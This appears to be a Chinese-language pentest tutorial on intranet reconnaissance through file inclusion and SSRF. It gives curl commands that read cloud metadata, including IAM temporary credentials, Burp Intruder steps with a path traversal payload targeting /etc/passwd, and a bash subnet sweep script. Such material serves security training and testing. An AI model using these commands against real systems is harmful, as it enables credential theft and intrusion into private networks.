🔍 内网IP扫描（Intranet Scanning）

利用文件包含漏洞配合 HTTP 伪协议，攻击者可以扫描内网资产，探测存活主机和开放端口。

1️⃣ 常见内网IP段

IP范围说明
10.0.0.0/8A类私有地址，大型企业内部网络
172.16.0.0/12B类私有地址，中型企业网络
192.168.0.0/16C类私有地址，小型企业/家庭网络
169.254.169.254云服务商元数据IP（AWS/GCP/Azure）
100.100.100.200阿里云元数据IP

2️⃣ 云环境元数据读取（SSRF攻击）

# AWS - 读取内网IP
curl http://169.254.169.254/latest/meta-data/local-ipv4

# AWS - 读取临时凭证（高危！）
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/admin

# GCP
curl http://169.254.169.254/computeMetadata/v1/instance/network-interfaces/0/ip

# 阿里云
curl http://100.100.100.200/latest/meta-data/

3️⃣ Burp Intruder 批量扫描

  1. 拦截请求 GET /page?name=help
  2. 发送到 Intruder（Ctrl+I）
  3. 将 name 参数设为 payload 位置
  4. 添加 payload：../../../../../../etc/passwd 等
  5. 根据响应长度/状态码判断是否存在漏洞

4️⃣ curl 批量扫描脚本

#!/bin/bash
for ip in $(seq 1 254); do
    curl -s --connect-timeout 1 "http://192.168.1.$ip:80/" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "存活: 192.168.1.$ip"
    fi
done
